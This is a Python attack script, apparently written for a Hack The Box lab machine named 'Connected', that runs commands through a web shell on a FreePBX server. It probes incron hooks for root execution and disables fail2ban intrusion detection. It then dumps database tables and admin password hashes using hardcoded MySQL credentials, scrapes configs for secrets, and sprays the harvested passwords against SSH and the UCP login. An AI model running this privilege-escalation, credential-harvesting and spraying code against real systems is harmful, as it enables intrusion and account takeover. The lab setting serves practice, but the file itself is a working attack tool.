#!/usr/bin/env python3
"""Incron root proof + MySQL cred harvest + SSH/UCP spray."""
import pathlib
import re
import subprocess
import sys

sys.path.insert(0, "/home/kali/Desktop/htb/Connected/scripts")
from enum_privesc import get_shell  # noqa: E402

IP = "10.129.245.100"
LOOT = pathlib.Path("/home/kali/Desktop/htb/Connected/loot")
BASE = "http://connected.htb"

STATIC_PASS = {
    "qf0cl1r2o9sd79s2bn7habsu4r",
    "h0kesimg5368cii56h2i7ll8qn",
    "mZzDpAGKTmPJ",
    "cxmanager*con",
}


def main():
    cmd, url = get_shell()
    lines = [f"shell: {url}\n"]
    print("[+] shell", url)

    remote = [
        ("hooks dir", "ls -la /var/www/html/admin/modules/sysadmin/hooks/ 2>&1 | head -40"),
        (
            "dump-iptables hook",
            "head -80 /var/www/html/admin/modules/sysadmin/hooks/dump-iptables 2>&1; "
            "file /var/www/html/admin/modules/sysadmin/hooks/dump-iptables 2>&1",
        ),
        ("fail2ban before", "systemctl is-active fail2ban 2>&1; pgrep -a fail2ban 2>&1 | head -3"),
        (
            "trigger intrusion_detection_stop",
            "touch /var/spool/asterisk/sysadmin/intrusion_detection_stop; sleep 3; "
            "systemctl is-active fail2ban 2>&1; pgrep -a fail2ban 2>&1 | head -3",
        ),
        (
            "copy signed dump-iptables to incron",
            "rm -f /tmp/iptables-save-output; "
            "cp -a /var/www/html/admin/modules/sysadmin/hooks/dump-iptables "
            "/var/spool/asterisk/incron/sysadmin.dump-iptables.CONTENTS 2>&1; "
            "sleep 5; ls -la /var/spool/asterisk/incron/ /tmp/iptables-save-output 2>&1; "
            "head -5 /tmp/iptables-save-output 2>&1",
        ),
        (
            "local incron signed hook",
            "rm -f /tmp/iptables-save-output; "
            "cp -a /var/www/html/admin/modules/sysadmin/hooks/dump-iptables "
            "/usr/local/asterisk/incron/sysadmin.dump-iptables.CONTENTS 2>&1; "
            "sleep 5; ls -la /usr/local/asterisk/incron/; "
            "stat /tmp/iptables-save-output 2>&1; head -3 /tmp/iptables-save-output 2>&1",
        ),
        (
            "sysadmin-hook logs",
            "grep -i sysadmin-hook /var/log/messages 2>/dev/null | tail -30; "
            "journalctl -t sysadmin-hook --no-pager -n 25 2>&1",
        ),
        (
            "kvstore tables",
            "mysql -u freepbxuser -p'mZzDpAGKTmPJ' -h127.0.0.1 asterisk -N -e "
            "\"SHOW TABLES LIKE 'kvstore%'\" 2>&1",
        ),
        (
            "kvstore Cxpanel",
            "mysql -u freepbxuser -p'mZzDpAGKTmPJ' -h127.0.0.1 asterisk -e "
            "\"SELECT id,\\`key\\`,LEFT(val,200) FROM kvstore_FreePBX_modules_Cxpanel\" 2>&1",
        ),
        (
            "kvstore Sysadmin",
            "mysql -u freepbxuser -p'mZzDpAGKTmPJ' -h127.0.0.1 asterisk -e "
            "\"SELECT id,\\`key\\`,LEFT(val,200) FROM kvstore_FreePBX_modules_Sysadmin\" 2>&1",
        ),
        (
            "sysadmin_options",
            "mysql -u freepbxuser -p'mZzDpAGKTmPJ' -h127.0.0.1 asterisk -e "
            "\"SELECT * FROM sysadmin_options LIMIT 40\" 2>&1",
        ),
        (
            "misc secrets",
            "grep -rE 'pass|secret' /etc/asterisk/manager.conf /etc/freepbx.conf 2>/dev/null | head -20; "
            "mysql -u freepbxuser -p'mZzDpAGKTmPJ' -h127.0.0.1 asterisk -e "
            "\"SELECT username,password_sha1 FROM ampusers WHERE username='admin'\" 2>&1",
        ),
    ]

    root_incron = False
    for title, c in remote:
        o = cmd(c, timeout=180)
        lines.append(f"=== {title} ===\n{o}\n")
        print(f"\n## {title}\n{o[:4000]}")
        if "iptables-save-output" in o and "No such file" not in o and "-rw" in o:
            root_incron = True

    lines.append(f"ROOT_INCRON_DUMP={root_incron}\n")
    out = "\n".join(lines)
    LOOT.joinpath("root-incron-ssh.txt").write_text(out)

    passes = set(STATIC_PASS)
    for m in re.finditer(r"(?:password|secret|pass)[\"'=:\s]+([^\s\"'|]{4,80})", out, re.I):
        passes.add(m.group(1).strip())

    users = ["admin", "root", "asterisk", "freepbx", "cxpanel"]
    hits = []
    for u in users:
        for p in sorted(passes):
            r = subprocess.run(
                [
                    "sshpass", "-p", p, "ssh",
                    "-o", "StrictHostKeyChecking=no",
                    "-o", "ConnectTimeout=6",
                    f"{u}@{IP}", "id",
                ],
                capture_output=True,
                text=True,
                timeout=10,
            )
            if r.returncode == 0:
                hits.append(f"SSH {u}:{p} -> {r.stdout.strip()}")

    import requests
    import urllib3

    urllib3.disable_warnings()
    s = requests.Session()
    s.verify = False
    for user, pw in [
        ("admin", "mZzDpAGKTmPJ"),
        ("admin", "qf0cl1r2o9sd79s2bn7habsu4r"),
        ("admin", "h0kesimg5368cii56h2i7ll8qn"),
    ]:
        r = s.post(
            f"{BASE}/ucp/ajax.php",
            data={"command": "login", "username": user, "password": pw},
            headers={"Referer": f"{BASE}/ucp/"},
            timeout=15,
        )
        if "success" in r.text.lower() and "invalid" not in r.text.lower():
            hits.append(f"UCP {user}:{pw}")

    spray_txt = "\n".join(hits) if hits else "no hits"
    LOOT.joinpath("ssh-spray.txt").write_text(spray_txt)
    LOOT.joinpath("mysql-passwords-tried.txt").write_text(
        "passwords:\n" + "\n".join(sorted(passes))
    )
    print("\nROOT_INCRON_DUMP", root_incron)
    print("SPRAY", spray_txt)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())